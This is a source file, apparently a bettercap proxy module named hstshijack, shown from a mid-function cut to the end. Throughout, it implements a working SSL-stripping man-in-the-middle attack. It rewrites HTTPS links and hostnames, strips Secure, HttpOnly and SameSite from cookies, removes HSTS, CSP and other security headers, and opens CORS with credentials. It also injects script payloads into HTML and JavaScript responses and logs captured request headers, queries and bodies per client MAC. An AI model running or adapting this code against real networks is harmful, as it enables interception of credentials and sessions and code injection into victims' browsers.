				indexed_domains_length += ssl.index[ssl.prefixes[a]].length;
			}
			if (indexed_domains_length !== all_domains.length) {
				log_fatal(on_blue + "hstshijack" + reset + " List of SSL domains is not indexed. Please set your hstshijack.ssl.index.check value to true in your caplet.");
			}
			log_info(on_blue + "hstshijack" + reset + " Skipped SSL index check for " + all_domains.length + " domain(s).");
		}
	}

	/* Ensure targeted hosts are in SSL log (no wildcards). */
	for (var a = 0; a < target_hosts.length; a++) {
		if (target_hosts[a].indexOf("*") === -1) {
			indexDomain(target_hosts[a]);
		}
	}

	saveSSLIndex();
	log_info(on_blue + "hstshijack" + reset + " Indexed " + ssl.domains.length + " domains.");
}

function showConfig() {
	/* Print module configuration. */
	logStr  = "\n";
	logStr += "  " + bold + "Caplet" + reset + "\n";
	logStr += "\n";
	logStr += "    " + yellow + "    hstshijack.ssl.domains" + reset + " > " + (env["hstshijack.ssl.domains"] ? green + env["hstshijack.ssl.domains"] : red + "undefined") + reset + "\n";
	logStr += "    " + yellow + "      hstshijack.ssl.index" + reset + " > " + (env["hstshijack.ssl.index"] ? green + env["hstshijack.ssl.index"] : red + "undefined") + reset + "\n";
	logStr += "    " + yellow + "hstshijack.ssl.index.check" + reset + " > " + (/^true$/i.test(env["hstshijack.ssl.index.check"]) ? green + "true" : red + "false") + reset + "\n";
	logStr += "    " + yellow + "         hstshijack.ignore" + reset + " > " + (env["hstshijack.ignore"] ? green + env["hstshijack.ignore"] : red + "undefined") + reset + "\n";
	logStr += "    " + yellow + "        hstshijack.targets" + reset + " > " + (env["hstshijack.targets"] ? green + env["hstshijack.targets"] : red + "undefined") + reset + "\n";
	logStr += "    " + yellow + "   hstshijack.replacements" + reset + " > " + (env["hstshijack.replacements"] ? green + env["hstshijack.replacements"] : red + "undefined") + reset + "\n";
	logStr += "    " + yellow + "   hstshijack.blockscripts" + reset + " > " + (env["hstshijack.blockscripts"] ? green + env["hstshijack.blockscripts"] : red + "undefined") + reset + "\n";
	logStr += "    " + yellow + "      hstshijack.obfuscate" + reset + " > " + (obfuscate ? green + "true" : red + "false") + reset + "\n";
	logStr += "    " + yellow + "       hstshijack.payloads" + reset + " > ";
	if (env["hstshijack.payloads"]) {
		list = env["hstshijack.payloads"].replace(/^\s*(.*?)\s*$/g, "$1").split(",");
		logStr += green + list[0] + reset + "\n";
		if (list.length > 1) {
			for (a = 1; a < list.length; a++) {
				logStr += "                            > " + green + list[a] + reset + "\n";
			}
		}
	} else {
		logStr += red + "undefined" + reset + "\n";
	}
	logStr += "\n";
	logStr += "  " + bold + "Commands" + reset + "\n";
	logStr += "\n";
	logStr += "    " + bold + "       hstshijack.show" + reset + " : Show module info.\n";
	logStr += "    " + bold + "hstshijack.ssl.domains" + reset + " : Show recorded domains with SSL.\n";
	logStr += "    " + bold + "  hstshijack.ssl.index" + reset + " : Show SSL domain index.\n";
	logStr += "\n";
	logStr += "  " + bold + "Session info" + reset + "\n";
	logStr += "\n";
	logStr += "    " + bold + "      Session ID" + reset + " : " + session_id + "\n";
	logStr += "    " + bold + "   Callback path" + reset + " : " + callback_path + "\n";
	logStr += "    " + bold + "  Whitelist path" + reset + " : " + whitelist_path + "\n";
	logStr += "    " + bold + "  SSL index path" + reset + " : " + ssl_index_path + "\n";
	logStr += "    " + bold + "  __Host- prefix" + reset + " : " + cookie_host_prefix + "\n";
	logStr += "    " + bold + "__Secure- prefix" + reset + " : " + cookie_secure_prefix + "\n";
	logStr += "    " + bold + "     SSL domains" + reset + " : " + ssl.domains.length + " domain" + (ssl.domains.length === 1 ? "" : "s") + "\n";
	console.log(logStr);
}

function onCommand(cmd) {
	if (cmd === "hstshijack.show") {
		showConfig();
		return true;
	}
	if (cmd === "hstshijack.ssl.domains") {
		if (ssl.domains.length > 20) {
			truncated_domains = ssl.domains.slice(0, 20);
			truncated_domains.push("...");
			log_string = truncated_domains.join(reset + "\n    " + yellow);
			console.log("\n" + bold + "  Recorded domains with SSL (" + ssl.domains.length + ")" + reset + "\n\n    " + yellow + log_string + reset + "\n");
		} else {
			console.log("\n" + bold + "  Recorded domains with SSL (" + ssl.domains.length + ")" + reset + "\n\n    " + yellow + ssl.domains.join(reset + "\n    " + yellow) + reset + "\n");
		}
		return true;
	}
	if (cmd === "hstshijack.ssl.index") {
		log_string = "\n" + bold + "  SSL domain index" + reset + "\n";
		for (a = 0; a !== ssl.prefixes.length; a++) {
			domain_prefix = ssl.prefixes[a];
			log_string += "\n    " + yellow + domain_prefix + reset + " (length: " + ssl.index[domain_prefix].length + ")";
		}
		console.log(log_string + "\n");
		return true;
	}
	if (cmd === "hstshijack.whitelist") {
		console.log("\n" + JSON.stringify(whitelist, null, 2) + "\n");
		return true;
	}
}

function onLoad() {
	math_seed = new Date().getMilliseconds();
	Math.random = function() {
		r = Math.sin(math_seed++) * 10000;
		return r - Math.floor(r);
	}
	String.prototype.startsWith = function(prefix) {
		return this.slice(0, prefix.length) === prefix;
	}

	log_info(on_blue + "hstshijack" + reset + " Generating random variable names for this session ...");
	session_id                = randomString(8 + Math.random() * 8);
	varname_target_hosts      = randomString(8 + Math.random() * 8);
	varname_replacement_hosts = randomString(8 + Math.random() * 8);
	cookie_host_prefix        = randomString(8 + Math.random() * 8);
	cookie_secure_prefix      = randomString(8 + Math.random() * 8);
	callback_path             = "/" + randomString(8 + Math.random() * 8);
	whitelist_path            = "/" + randomString(8 + Math.random() * 8);
	ssl_index_path            = "/" + randomString(8 + Math.random() * 8);

	rx_global_cookie_host_prefix = new RegExp(cookie_host_prefix, "g");
	rx_global_cookie_secure_prefix = new RegExp(cookie_secure_prefix, "g");

	log_info(on_blue + "hstshijack" + reset + " Reading caplet ...");
	configure();
	log_info(on_blue + "hstshijack" + reset + " Module loaded.");
	showConfig();
}

function onRequest(req, res) {
	if (req.Path === ssl_index_path) {
		/**
		 * SSL callback.
		 *
		 * Requests made for this path should include a hostname in the query so
		 * this module can send a HEAD request to learn HTTPS redirects.
		 */
		log_debug(on_blue + "hstshijack" + reset + " SSL callback received from " + green + req.Client.MAC + reset + " for " + bold + req.Query + reset + ".");
		queried_host = req.Query;
		if (getDomainIndex(queried_host) === -1) {
			log_debug(on_blue + "hstshijack" + reset + " Learning unencrypted HTTP response from " + queried_host + " ...");
			req.Hostname = queried_host;
			req.Path     = "/";
			req.Query    = "";
			req.Body     = "";
			req.Method   = "HEAD";
		}
	} else if (req.Path === callback_path) {
		/**
		 * Basic callback.
		 *
		 * Requests made for this path will be dropped.
		 * Requests made for this path will be printed.
		 */
		res.ClearBody();
		logStr = on_blue + "hstshijack" + reset + " Callback received from " + green + req.Client.MAC + reset + " for " + bold + req.Hostname + reset + "\n";
		logStr += "  " + on_grey + " " + reset + " \n  " + on_grey + " " + reset + "  [" + green + "hstshijack.callback" + reset + "] " + on_grey + "CALLBACK" + reset + " " + "http://" + req.Hostname + req.Path + (req.Query !== "" ? ("?" + req.Query) : "") + "\n  " + on_grey + " " + reset + " \n";
		logStr += "  " + on_grey + " " + reset + "  " + bold + "Headers" + reset + "\n  " + on_grey + " " + reset + " \n";
		headers = req.Headers.split("\r\n");
		for (i = 0; i < headers.length; i++) {
			if (headers[i].split(": ").length === 2) {
				params = headers[i].split(": ");
				logStr += "  " + on_grey + " " + reset + "    " + blue + params[0] + reset + ": " + yellow + params[1] + reset + "\n";
			} else {
				logStr += "  " + on_grey + " " + reset + "    " + yellow + headers[i] + reset + "\n";
			}
		}
		logStr += "  " + on_grey + " " + reset + "  " + bold + "Query" + reset + "\n  " + on_grey + " " + reset + " \n";
		queries = req.Query.split("&");
		for (i = 0; i < queries.length; i++) {
			if (queries[i].split("=").length === 2) {
				params = queries[i].split("=");
				logStr += "  " + on_grey + " " + reset + "    " + green + decodeURIComponent(params[0]) + reset + " : " + decodeURIComponent(params[1]) + reset + "\n";
			} else {
				logStr += "  " + on_grey + " " + reset + "    " + green + queries[i] + reset + "\n";
			}
		}
		logStr += "  " + on_grey + " " + reset + " \n  " + on_grey + " " + reset + "  " + bold + "Body" + reset + "\n  " + on_grey + " " + reset + " \n  " + on_grey + " " + reset + "    " + yellow + req.ReadBody() + reset + "\n";
		log_info(logStr);
	} else if (req.Path === whitelist_path) {
		/**
		 * Whitelisting callback.
		 *
		 * Requests made for this path will be dropped.
		 * Requests made for this path will be printed.
		 * Requests made for this path will stop all attacks towards this client with the requested hostname.
		 */
		res.ClearBody();
		logStr = on_blue + "hstshijack" + reset + " Whitelisting callback received from " + green + req.Client.MAC + reset + " for " + bold + req.Hostname + reset + "\n";
		logStr += "  " + on_white + " " + reset + " \n  " + on_white + " " + reset + "  [" + green + "hstshijack.callback" + reset + "] " + on_white + "WHITELIST" + reset + " " + "http://" + req.Hostname + req.Path + (req.Query !== "" ? ("?" + req.Query) : "") + "\n  " + on_white + " " + reset + " \n";
		logStr += "  " + on_white + " " + reset + "  " + bold + "Headers" + reset + "\n  " + on_white + " " + reset + " \n";
		headers = req.Headers.split("\n");
		for (i = 0; i < headers.length; i++) {
			if (headers[i].split(": ").length === 2) {
				params = headers[i].split(": ");
				logStr += "  " + on_white + " " + reset + "    " + blue + params[0] + reset + ": " + yellow + params[1] + reset + "\n";
			} else {
				logStr += "  " + on_white + " " + reset + "    " + yellow + headers[i] + reset + "\n";
			}
		}
		logStr += "  " + on_white + " " + reset + "  " + bold + "Query" + reset + "\n  " + on_white + " " + reset + " \n";
		queries = req.Query.split("&");
		for (i = 0; i < queries.length; i++) {
			if (queries[i].split("=").length === 2) {
				params = queries[i].split("=");
				logStr += "  " + on_white + " " + reset + "    " + green + decodeURIComponent(params[0]) + reset + " : " + decodeURIComponent(params[1]) + reset + "\n";
			} else {
				logStr += "  " + on_white + " " + reset + "    " + green + queries[i] + reset + "\n";
			}
		}
		logStr += "  " + on_white + " " + reset + " \n  " + on_white + " " + reset + "  " + bold + "Body" + reset + "\n  " + on_white + " " + reset + " \n  " + on_white + " " + reset + "    " + yellow + req.ReadBody() + reset + "\n";
		log_info(logStr);
		/* Add requested hostname to whitelist. */
		if (whitelist[req.Client.MAC]) {
			if (whitelist[req.Client.MAC].indexOf(req.Hostname) === -1) {
				whitelist[req.Client.MAC].push(req.Hostname);
			}
		} else {
			whitelist[req.Client.MAC] = [req.Hostname];
		}
		/* Also whitelist unspoofed version of requested hostname. */
		for (a = 0; a < target_hosts.length; a++) {
			rx_sets_whole_replacement_hosts[a][0].lastIndex = 0;
			if (rx_sets_whole_replacement_hosts[a][0].test(req.Hostname)) {
				whitelist[req.Client.MAC].push(req.Hostname.replace(
					rx_sets_whole_replacement_hosts[a][0],
					rx_sets_whole_replacement_hosts[a][1]));
				break;
			}
		}
		saveWhitelist();
	} else {
		/**
		 * Not a callback.
                 * 
		 * Redirect client to the real host if a whitelist callback was received previously.
		 * Restore spoofed hostnames and schemes in request.
		 */
		req.ReadBody();

		if (whitelist[req.Client.MAC]) {
			for (a = 0; a < whitelist[req.Client.MAC].length; a++) {
				whole_regexp_set = toWholeRegexpSet(whitelist[req.Client.MAC][a], "");
				whole_regexp_set[0].lastIndex = 0;
				if (whole_regexp_set[0].test(req.Hostname)) {
					/* Restore requested hostname if it was spoofed. */
					var unspoofed_host;
					for (b = 0; b < target_hosts.length; b++) {
						rx_sets_whole_replacement_hosts[b][0].lastIndex = 0;
						if (rx_sets_whole_replacement_hosts[b][0].test(req.Hostname)) {
							unspoofed_host = req.Hostname.replace(
								rx_sets_whole_replacement_hosts[b][0],
								rx_sets_whole_replacement_hosts[b][1]);
							query = (req.Query !== "" ? ("?" + req.Query) : "");
							res.SetHeader("Location", "https://" + unspoofed_host + req.Path + query);
							res.Status = 301;
							log_info(on_blue + "hstshijack" + reset + " Redirecting " + green + req.Client.MAC + reset + " from " + bold + req.Hostname + reset + " to " + bold + unspoofed_host + reset + " because we received a whitelisting callback.");
							return;
						}
					}
				}
			}
		}

		/* Restore original hostnames. */
		for (a = 0; a < target_hosts.length; a++) {
			/* Restore original hostnames in headers. */
			rx_sets_global_replacement_hosts[a][0].lastIndex = 0;
			if (rx_sets_global_replacement_hosts[a][0].test(req.Headers)) {
				req.Headers = req.Headers.replace(rx_sets_global_replacement_hosts[a][0], rx_sets_global_replacement_hosts[a][1]);
				log_debug(on_blue + "hstshijack" + reset + " Restored original hostname " + bold + replacement_hosts[a] + reset + " in request header(s).");
			}
		}

		/* Restore original hostnames in query URI. */
		if (req.Query !== "") {
			for (a = 0; a < target_hosts.length; a++) {
				rx_sets_global_replacement_hosts[a][0].lastIndex = 0;
				if (rx_sets_global_replacement_hosts[a][0].test(req.Query)) {
					req.Query = req.Query.replace(rx_sets_global_replacement_hosts[a][0], rx_sets_global_replacement_hosts[a][1]);
					log_debug(on_blue + "hstshijack" + reset + " Restored original hostname " + bold + replacement_hosts[a] + reset + " in query URI.");
				}

				/* Restore original hostnames in encoded query URI parameters. */
				query_params = req.Query.split("&");
				new_params = [];
				for (b = 0; b < query_params.length; b++) {
					param = query_params[b];
					param_parts = param.match(rx_query_param);
					if (param_parts) {
						param_name = param_parts[1];
						param_value = param_parts[2];
						if (param_value.indexOf("%") !== -1) {
							param_value_decoded = decodeURIComponent(param_value);
							if (param_value !== param_value_decoded) {
								rx_sets_global_replacement_hosts[a][0].lastIndex = 0;
								if (rx_sets_global_replacement_hosts[a][0].test(param_value_decoded)) {
									param_value_decoded_unspoofed = param_value_decoded.replace(
										rx_sets_global_replacement_hosts[a][0],
										rx_sets_global_replacement_hosts[a][1]);
									new_params.push(
										param_name + "=" + encodeURIComponent(param_value_decoded_unspoofed));
								} else {
									new_params.push(param);
								}
							} else {
								new_params.push(param);
							}
						} else {
							rx_sets_global_replacement_hosts[a][0].lastIndex = 0;
							if (rx_sets_global_replacement_hosts[a][0].test(param_value)) {
								param_value_unspoofed = param_value.replace(
									rx_sets_global_replacement_hosts[a][0],
									rx_sets_global_replacement_hosts[a][1]);
								new_params.push(param_name + "=" + param_value_unspoofed);
							} else {
								new_params.push(param);
							}
						}
					} else {
						new_params.push(param);
					}
				}
				new_query_string = new_params.join("&");
				if (new_query_string !== req.Query) {
					req.Query = new_query_string;
				}
			}
		}

		for (a = 0; a < target_hosts.length; a++) {
			/* Restore original hostname of request. */
			rx_sets_whole_replacement_hosts[a][0].lastIndex = 0;
			if (rx_sets_whole_replacement_hosts[a][0].test(req.Hostname)) {
				spoofed_host = req.Hostname;
				req.Hostname = req.Hostname.replace(rx_sets_whole_replacement_hosts[a][0], rx_sets_whole_replacement_hosts[a][1]);
				req.Scheme   = "https";
				log_debug(on_blue + "hstshijack" + reset + " Restored original hostname " + bold + spoofed_host + reset + " to " + req.Hostname + " and restored HTTPS scheme.");
				break;
			}
		}

		/* Restore HTTPS scheme. */
		if (getDomainIndex(req.Hostname) !== -1) {
			/* Restore HTTPS scheme of request if domain is indexed. */
			if (req.Scheme !== "https") {
				req.Scheme = "https";
				log_debug(on_blue + "hstshijack" + reset + " Restored HTTPS scheme of indexed domain " + bold + req.Hostname + reset + ".");
			}
			/* Restore HTTPS scheme in request headers if requested domain is indexed. */
// fix this by searching for all URLs and then finding if they need SSL
			escaped_domain = req.Hostname.replace(rx_all_dots, "[.]").replace(rx_all_dashes, "[-]");
			regexp = new RegExp("http://" + escaped_domain + "([^a-z0-9-.]|$)", "ig");
			regexp.lastIndex = 0;
			if (regexp.test(req.Headers)) {
				req.Headers = req.Headers.replace(regexp, "https://" + req.Hostname + "$1");
				log_debug(on_blue + "hstshijack" + reset + " Restored HTTPS scheme of indexed domain " + req.Hostname + " in request headers.");
			}
			/* Restore HTTPS scheme in request headers if domains are targeted. */
			for (a = 0; a < target_hosts.length; a++) {
				matches = req.Headers.match(rx_sets_global_target_hosts[a][0]) || [];
				for (b = 0; b < matches.length; b++) {
					escaped_domain = matches[b].replace(rx_all_dots, "\\.");
					regexp = new RegExp("http://" + escaped_domain + "([^a-z0-9-.]|$)", "ig");
					req.Headers = req.Headers.replace(regexp, "https://" + matches[b] + "$1");
					log_debug(on_blue + "hstshijack" + reset + " Restored HTTPS scheme of indexed domain " + req.Hostname + " in request headers.");
				}
			}
		} else { /* If requested domain is not indexed. */

			// TODO
			// we can perform an SSL check synchronously with a set timeout, and/or we can
			// perform an SSL check asynchronously for future hijacking attempts

			log_debug(on_blue + "hstshijack" + reset + " Domain " + bold + req.Hostname + reset + " is not indexed.");
			/* Restore HTTPS scheme of request if domain is targeted. */
			for (a = 0; a < target_hosts.length; a++) {
				rx_sets_whole_target_hosts[a][0].lastIndex = 0;
				if (rx_sets_whole_target_hosts[a][0].test(req.Hostname)) {
					req.Scheme = "https";
					log_debug(on_blue + "hstshijack" + reset + " Restored HTTPS scheme of targeted domain " + bold + req.Hostname + reset + ".");
					break;
				}
			}
			/* Restore HTTPS scheme in request headers if domains are targeted. */
			for (a = 0; a < target_hosts.length; a++) {
				matches = req.Headers.match(rx_sets_global_target_hosts[a][0]) || [];
				for (b = 0; b < matches.length; b++) {
					escaped_domain = matches[b].replace(rx_all_dots, "\\.");
					regexp = new RegExp("http://" + escaped_domain + "([^a-z0-9-.]|$)", "ig");
					req.Headers = req.Headers.replace(regexp, "https://" + matches[b] + "$1");
					log_debug(on_blue + "hstshijack" + reset + " Restored HTTPS scheme of indexed domain " + req.Hostname + " in request headers.");
				}
			}
		}

		/* Execute regex header replacements. */
		Object.keys(replacements_req_headers).forEach(function(selector_string, a) {
			rx_target_hosts_replacements_req_headers[a].lastIndex = 0;
			if (rx_target_hosts_replacements_req_headers[a].test(req.Hostname)) {
				replacements_req_headers[selector_string].forEach(function(rx_set) {
					req.Headers = req.Headers.replace(rx_set[0], rx_set[1]);
				});
			}
		});

		/* Execute regex body replacements. */
		Object.keys(replacements_req_body).forEach(function(selector_string, a) {
			rx_target_hosts_replacements_req_body[a].lastIndex = 0;
			if (rx_target_hosts_replacements_req_body[a].test(req.Hostname)) {
				replacements_req_body[selector_string].forEach(function(rx_set) {
					req.Body = req.Body.replace(rx_set[0], rx_set[1]);
				});
			}
		});

		/* Execute regex URL replacements. */
		Object.keys(replacements_req_url_path).forEach(function(selector_string, a) {
			rx_target_hosts_replacements_req_url_path[a].lastIndex = 0;
			if (rx_target_hosts_replacements_req_url_path[a].test(req.Hostname)) {
				replacements_req_url_path[selector_string].forEach(function(rx_set) {
					req.Path = req.Path.replace(rx_set[0], rx_set[1]);
				});
			}
		});
		Object.keys(replacements_req_url_port).forEach(function(selector_string, a) {
			rx_target_hosts_replacements_req_url_port[a].lastIndex = 0;
			if (rx_target_hosts_replacements_req_url_port[a].test(req.Hostname)) {
				replacements_req_url_port[selector_string].forEach(function(rx_set) {
					req.Port = req.Port.replace(rx_set[0], rx_set[1]);
				});
			}
		});
		Object.keys(replacements_req_url_query).forEach(function(selector_string, a) {
			rx_target_hosts_replacements_req_url_query[a].lastIndex = 0;
			if (rx_target_hosts_replacements_req_url_query[a].test(req.Hostname)) {
				replacements_req_url_query[selector_string].forEach(function(rx_set) {
					req.Query = req.Query.replace(rx_set[0], rx_set[1]);
				});
			}
		});

		/* Restore cookies. */
		req.Headers = req.Headers
			.replace(rx_global_cookie_host_prefix, "__Host-")
			.replace(rx_global_cookie_secure_prefix, "__Secure-");
	}
}

function onResponse(req, res) {
	res.ReadBody();

	/* Remember HTTPS redirects. */
	var location = res.GetHeader("Location", "");
	if (rx_uri_one.test(location)) {
		indexDomain(location.replace(rx_uri_two, "$1"));
	}

	/* Ignore this response if whitelisted. */
	if (whitelist[req.Client.MAC]) {
		if (whitelist[req.Client.MAC].indexOf(req.Hostname) !== -1) {
			log_debug(on_blue + "hstshijack" + reset + " Ignoring response from " + bold + req.Hostname + reset + " for " + bold + req.Client.MAC + reset + ".");
			return;
		}
	} else {
		for (a = 0; a < ignore_hosts.length; a++) {
			var whole_regexp_set;
			if (ignore_hosts[a] !== "*") {
				whole_regexp_set = toWholeRegexpSet(ignore_hosts[a], "");
			}

			whole_regexp_set[0].lastIndex = 0;
			if (
				ignore_hosts[a] === "*"
				|| whole_regexp_set[0].test(req.Hostname)
			) {
				log_debug(on_blue + "hstshijack" + reset + " Ignored response from " + bold + req.Hostname + reset + ".");
				return;
			}
		}

		/* Spoof markup bodies. */
		if (
			rx_content_type_html.test(res.ContentType)
			|| rx_extension_html.test(req.Path)
		) {
			/* Execute regex replacements. */
			Object.keys(replacements_res_body.html).forEach(function(selector_string, a) {
				var rx_sets = replacements_res_body.html[selector_string];
				if (selector_string === "*") {
					rx_sets.forEach(function(rx_set) {
						res.Body = res.Body.replace(rx_set[0], rx_set[1]);
					});
				} else {
					var rx_hostname = rx_target_hosts_replacements_res_body_html[a];
					rx_hostname.lastIndex = 0;
					if (rx_hostname.test(req.Hostname)) {
						rx_sets.forEach(function(rx_set) {
							res.Body = res.Body.replace(rx_set[0], rx_set[1]);
						});
					}
				}
			});

			/* Block scripts. */
			for (a = 0; a < block_script_hosts.length; a++) {
				if (
					block_script_hosts[a] === "*"
					|| toWholeRegexpSet(block_script_hosts[a], "")[0].test(req.Hostname)
				) {
					res.Body = res.Body.replace(rx_html_script_open_tag, "<div style=\"display:none;\"$1");
					res.Body = res.Body.replace(rx_html_script_close_tag, "</div$1");
					log_debug(on_blue + "hstshijack" + reset + " Blocked inline script tags in a document from " + bold + req.Hostname + reset + ".");
					break;
				}
			}

			/* Inject payloads. */
			injection = "";
			for (a = 0; a < Object.keys(payloads).length; a++) {
				injecting_host = Object.keys(payloads)[a];
				if (
					injecting_host === "*"
					|| toWholeRegexpSet(injecting_host, "")[0].test(req.Hostname)
				) {
					injection = injection + payloads[injecting_host];
				}
			}
			if (injection !== "") {
				rx_html_magic.lastIndex = 0;
				if (rx_html_magic.test(res.Body.slice(0, 1000))) {
					if (rx_doctype_html.test(res.Body)) {
						var match = res.Body.match(rx_doctype_html);
						injection = "<script>\n" +
							payload_container_prefix + injection + payload_container_suffix +
							"</script>\n";
						res.Body = res.Body.slice(0, match.index) +
							injection +
							res.Body.slice(match.index + match[0].length, res.Body.length);
					} else {
						res.Body = 
							"<script>\n" +
							payload_container_prefix + injection + payload_container_suffix +
							"</script>\n" +
							res.Body;
					}
				}
				log_debug(on_blue + "hstshijack" + reset + " Injected document from " + bold + req.Hostname + reset + " for " + bold + req.Client.MAC + reset);
			}
		}

		/* Spoof JavaScript bodies. */
		if (
			rx_content_type_js.test(res.ContentType)
			|| rx_extension_js.test(req.Path)
		) {
			/* Block scripts. */
			for (a = 0; a < block_script_hosts.length; a++) {
				if (
					block_script_hosts[a] === "*"
					|| toWholeRegexpSet(block_script_hosts[a], "")[0].test(req.Hostname)
				) {
					res.Body = "";
					log_debug(on_blue + "hstshijack" + reset + " Cleared JavaScript resource from " + bold + req.Hostname + reset + ".");
					break;
				}
			}

			/* Execute regex replacements. */
			Object.keys(replacements_res_body.javascript).forEach(function(selector_string) {
				var rx_sets = replacements_res_body.javascript[selector_string];
				if (selector_string === "*") {
					rx_sets.forEach(function(rx_set) {
						res.Body = res.Body.replace(rx_set[0], rx_set[1]);
					});
				} else {
					var rx_hostname = rx_target_hosts_replacements_res_body_javascript[a];
					rx_hostname.lastIndex = 0;
					if (rx_hostname.test(req.Hostname)) {
						rx_sets.forEach(function(rx_set) {
							res.Body = res.Body.replace(rx_set[0], rx_set[1]);
						});
					}
				}
			});

			/* Inject payloads. */
			injection = "";
			for (a = 0; a < Object.keys(payloads).length; a++) {
				injecting_host = Object.keys(payloads)[a];
				if (
					injecting_host === "*"
					|| toWholeRegexpSet(injecting_host, "")[0].test(req.Hostname)
				) {
					injection = injection + payloads[injecting_host];
				}
			}
			if (injection !== "") {
				res.Body = payload_container_prefix + injection + payload_container_suffix + res.Body;
				log_debug(on_blue + "hstshijack" + reset + " Injected JavaScript file from " + bold + req.Hostname + reset + " for " + bold + req.Client.MAC + reset);
			}
		}

		/* Spoof JSON bodies. */
		if (
			rx_content_type_json.test(res.ContentType)
			|| rx_extension_json.test(req.Path)
		) {
			/* Execute regex replacements. */
			Object.keys(replacements_res_body.json).forEach(function(selector_string) {
				var rx_sets = replacements_res_body.json[selector_string];
				if (selector_string === "*") {
					rx_sets.forEach(function(rx_set) {
						res.Body = res.Body.replace(rx_set[0], rx_set[1]);
					});
				} else {
					var rx_hostname = rx_target_hosts_replacements_res_body_json[a];
					rx_hostname.lastIndex = 0;
					if (rx_hostname.test(req.Hostname)) {
						rx_sets.forEach(function(rx_set) {
							res.Body = res.Body.replace(rx_set[0], rx_set[1]);
						});
					}
				}
			});
		}

		/* Strip SSL from location headers. */
		res.Headers = res.Headers
			.replace(rx_scheme_http_https_colon, "$1:")
			.replace(rx_port_https, "$1");

		/* Spoof hosts in headers. */
		for (a = 0; a < target_hosts.length; a++) {
			res.Headers = res.Headers.replace(
				rx_sets_global_target_hosts[a][0],
				rx_sets_global_target_hosts[a][1]);
		}

		/* Spoof cookies. */
		var cookie_strings = res.GetHeaders("set-cookie");
		cookie_strings.forEach(function(cookie_string) {
			var cookie = parseCookie(cookie_string);
			if (downgrade_cookies) {
				cookie.sameSite = "";
				cookie.secure = false;
				cookie.partitioned = false;
				cookie.httpOnly = false;
				cookie.name = cookie.name
					.replace(rx_cookie_host_prefix, cookie_host_prefix)
					.replace(rx_cookie_secure_prefix, cookie_secure_prefix);
			}
			if (typeof cookie.domain === "string" && cookie.domain !== "") {
				var selector_string = cookie.domain[0] === "."
					? "*" + cookie.domain : cookie.domain;
				if (selector_string[0] === "*") {
					for (a = 0; a < target_hosts.length; a++) {
						if (selector_string === target_hosts[a]) {
							cookie.domain = replacement_hosts[a].slice(1);
							break;
						} else {
							rx_sets_whole_target_hosts[a][0].lastIndex = 0;
							if (rx_sets_whole_target_hosts[a][0].test("a" + cookie.domain)) {
								cookie.domain = ("a" + cookie.domain).replace(
									rx_sets_whole_target_hosts[a][0],
									rx_sets_whole_target_hosts[a][1]);
								cookie.domain = cookie.domain.slice(1);
								break;
							}
						}
					}
				} else {
					for (a = 0; a < target_hosts.length; a++) {
						rx_sets_whole_target_hosts[a][0].lastIndex = 0;
						if (rx_sets_whole_target_hosts[a][0].test(selector_string)) {
							cookie.domain = cookie.domain.replace(
								rx_sets_whole_target_hosts[a][0],
								rx_sets_whole_target_hosts[a][1]);
							break;
						}
					}
				}
			}
			res.Headers = res.Headers.replace(
				cookie_string,
				cookieToResponseHeaderValue(cookie));
		});

		/* Remove security headers. */
		res.Headers = res.Headers
			.replace(rx_header_csp, "")
			.replace(rx_header_cspro, "")
			.replace(rx_header_corp, "");
		res.RemoveHeader("Strict-Transport-Security");
		res.RemoveHeader("Public-Key-Pins");
		res.RemoveHeader("Public-Key-Pins-Report-Only");
		res.RemoveHeader("X-Frame-Options");
		res.RemoveHeader("X-Content-Type-Options");
		res.RemoveHeader("X-Download-Options");
		res.RemoveHeader("X-Permitted-Cross-Domain-Policies");
		res.RemoveHeader("X-XSS-Protection");
		res.RemoveHeader("Expect-Ct");

		/* Set insecure headers. */
		allowed_origin = res.GetHeader("Access-Control-Allow-Origin", "*");
		if (allowed_origin !== "*") {
			for (a = 0; a < target_hosts.length; a++) {
				rx_sets_global_target_hosts[a][0].lastIndex = 0;
				if (rx_sets_global_target_hosts[a][0].test(allowed_origin)) {
					allowed_origin = allowed_origin.replace(
						rx_sets_global_target_hosts[a][0],
						rx_sets_global_target_hosts[a][1]);
					break;
				}
			}
		} else {
			var request_origin = req.GetHeader("origin", "");
			if (request_origin !== "") {
				for (a = 0; a < target_hosts.length; a++) {
					rx_sets_global_target_hosts[a][0].lastIndex = 0;
					if (rx_sets_global_target_hosts[a][0].test(request_origin)) {
						allowed_origin = request_origin
							.replace(rx_scheme_http_https_colon, "$1:")
							.replace(
								rx_sets_global_target_hosts[a][0],
								rx_sets_global_target_hosts[a][1]);
						break;
					}
				}
			}
		}
		res.SetHeader("Access-Control-Allow-Credentials", "true");
		res.SetHeader("Access-Control-Allow-Origin", allowed_origin);
		res.SetHeader("Access-Control-Allow-Methods", "*");
		res.SetHeader("Access-Control-Allow-Headers", "*");
		res.SetHeader("Cross-Origin-Embedder-Policy", "unsafe-none");
		res.SetHeader("Cross-Origin-Opener-Policy", "unsafe-none");
		/* Spoof preflight headers. */
		if (req.Method === "OPTIONS") {
			var requested_headers = req.GetHeader("Access-Control-Request-Headers", "");
			if (requested_headers !== "")
				res.SetHeader("Access-Control-Allow-Headers", requested_headers);
		}
		res.SetHeader("Cache-Control", "no-cache, no-store, must-revalidate");
		res.SetHeader("Expires", "Fri, 20 Apr 2018 04:20:00 GMT");
		res.SetHeader("Pragma", "no-cache");
	}
}

